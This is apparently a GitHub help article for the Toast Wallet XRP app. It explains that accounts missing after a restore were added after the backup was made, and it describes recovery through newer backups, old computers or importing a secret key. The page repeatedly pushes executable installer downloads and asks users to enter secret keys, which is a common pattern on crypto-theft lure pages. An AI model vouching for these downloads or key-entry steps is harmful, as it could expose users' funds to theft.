<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Toast Wallet missing addresses after restore</h1>

<p align="center">Why some accounts do not appear and how to bring them back.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

Addresses go missing after a Toast Wallet restore when the backup was made before those accounts were added. Look for a newer backup code, check old computers for wallet data the [latest desktop wallet](https://github.com/Toast-Wallet/core/releases/tag/3.0.0) can open, or import the missing account directly with its XRP secret key.

## 👀 You'll see this if

- You restored a backup and one or more accounts are not listed.
- Your main account appears, but a second or third one does not.
- An explorer shows XRP on an address that your wallet does not list.
- You restored the same backup twice and get the same incomplete list.

## 🤔 Why it happens

A Toast Wallet backup code is a snapshot. When you choose Backup Wallet, the app saves the accounts that exist at that moment. If you add another account later and never make a new backup, that account is not inside the old code. Restoring the old code faithfully brings back the old list.

The XRP on the missing address has not moved. It is on the XRP Ledger, controlled by the key for that address. You just need a source that holds that key: a newer backup, the original wallet data, or the account's secret key.

## 🧭 Before you start

Write down the missing address if you know it, along with any approximate date when you created that account. Gather all backup codes you can find and list every computer that ever ran Toast Wallet, including ones stored in a cupboard.

## 🛠️ Fix: bring the missing accounts back

1. **List what you expect.** Write down every address you believe you had. Old exchange withdrawal records or emails often show the address you sent to.
2. **Find newer backup codes.** Search notes, safes and old paperwork for any backup with a later date. Restore the newest one, following [restore a Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/restore-toast-wallet-backup.md).
3. **Check old computers.** If a computer that once ran Toast Wallet still exists, install the latest desktop wallet on it without deleting anything. Earlier wallet files still open in the current release. See [open old Toast Wallet files](https://github.com/Toast-Wallet/learn/blob/main/how-to/open-old-toast-wallet-files.md).
4. **Make a complete backup.** Once all accounts appear in one place, create a new backup code that includes them.
5. **Import by secret key if you have it.** If you saved the secret key of the missing account (it starts with `s`), add it with **+ → Import an existing account**. Steps are in [import an XRP secret key into Toast Wallet](https://github.com/Toast-Wallet/learn/blob/main/how-to/import-xrp-secret-key-into-toast-wallet.md).
6. **Make a new backup again.** After any import, create a fresh backup code.

## ⚠️ Common mistakes

- Assuming that every account ever created is inside every backup, regardless of date.
- Creating a brand-new account to "replace" the missing one, which produces a different address.
- Deleting wallet data on an old computer before checking whether it holds the missing account.
- Typing a missing address into a website that claims to "recover lost XRP addresses".
- Forgetting to make one complete backup after all accounts are visible again.

## 🔁 If that did not work

- **No newer backup and no old computer.** Without a backup that contains the account, the original wallet data or the secret key, the account cannot be reopened.
- **The balance shows zero.** The account may be listed but still loading, or it was never activated. See [Toast Wallet balance shows zero](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-balance-shows-zero.md).
- **You have a 12 or 24 word phrase for that account.** Convert it offline to a secret key first, as described in [Toast Wallet seed phrase to secret key offline](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-seed-phrase-to-secret-key-offline.md).

## 🛡️ Prevention

Make a new backup code immediately after adding an account. Write the date and the list of addresses on the backup sheet. Keep older backups labelled as replaced rather than mixing them with the current one.

## 📝 Good to know

Restoring an older backup does not harm the missing account in any way. The account simply sits on the XRP Ledger, waiting for a copy of Toast Wallet that holds its key. That means you can try several backups, one after another, without risk. Make notes of which backup contains which accounts, so that at the end you can build one complete, current backup from them.

## 🔍 A closer look at finding old addresses

Your own records are often the fastest way to work out which addresses you had. Exchanges keep a history of withdrawals, including the destination address. Old emails from exchanges may confirm withdrawals with the address included. Notes you made at setup, screenshots of receive screens and messages to friends asking them to send XRP can all contain an `r` address. Collect them into one list.

Once you have the list, compare it with what Toast Wallet shows after each restore. Ticking off addresses one by one makes it clear which backup or which old computer you still need to find. It also prevents the common mistake of searching for an account that never held any XRP in the first place.

## ❓ FAQ

<details>
<summary>Did restoring delete the missing account?</summary>

No. Restoring never deletes anything on the ledger. The backup simply did not include that account.

</details>

<details>
<summary>Can someone look up my missing account for me?</summary>

Anyone can view an address publicly, but nobody can give you its key. Ignore offers to "recover" accounts.

</details>

<details>
<summary>Does Toast Wallet scan for accounts automatically?</summary>

Restore brings back what is inside the backup. Accounts outside it need another source.

</details>

> [!WARNING]
> Never send your backup code or secret key to someone who says they can find missing addresses. That is a recovery scam.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Restore a Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/restore-toast-wallet-backup.md) | Bring your accounts back with the backup code and passphrase or words. |
| [Open old Toast Wallet files](https://github.com/Toast-Wallet/learn/blob/main/how-to/open-old-toast-wallet-files.md) | Older wallet files still open in the current desktop release. |
| [Import an XRP secret key into Toast Wallet](https://github.com/Toast-Wallet/learn/blob/main/how-to/import-xrp-secret-key-into-toast-wallet.md) | Add an existing account with its secret key starting with s. |
| [Toast Wallet balance shows zero](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-balance-shows-zero.md) | Reasons a balance reads zero and how to confirm your XRP. |
